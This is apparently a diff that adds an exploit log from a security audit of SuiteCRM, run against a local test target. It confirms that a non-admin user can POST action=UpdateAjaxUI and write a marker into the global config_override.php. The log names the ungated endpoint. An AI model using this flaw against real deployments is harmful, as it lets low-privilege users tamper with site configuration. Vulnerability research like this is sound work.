@@ -1,0 +1,18 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-034/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-034/../.venv
+========================================================================
+VULN-034: non-admin write to global config_override.php via ungated UpdateAjaxUI
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web login
+[SETUP] provisioning a single low-priv (non-admin) user U
+[INFO] U = mod_bd8286c5 (d0d89ecd-745a-4515-b4b1-43bdc93eb187)
+[STEP] control: U POSTs to the admin-gated sibling action=savetabs
+[INFO] control response: status=200 len=38 contains 'ERR_NOT_ADMIN' marker: False
+[STEP] attack: U (non-admin) POSTs action=UpdateAjaxUI with marker module 'StageTenBannedModule_e097ad22'
+[INFO] attack response status=200
+[PROOF] reading config_override.php from the app container
+[PROOF] marker 'StageTenBannedModule_e097ad22' present under 'addAjaxBannedModules' in config_override.php: True
+[PROOF] decisive config_override.php excerpt: $sugar_config['addAjaxBannedModules'][0] = 'StageTenBannedModule_e097ad22';
+[OK] non-admin user U durably rewrote global config_override.php
+==> VULN-034: CONFIRMED — non-admin wrote addAjaxBannedModules containing StageTenBannedModule_e097ad22 into config_override.php
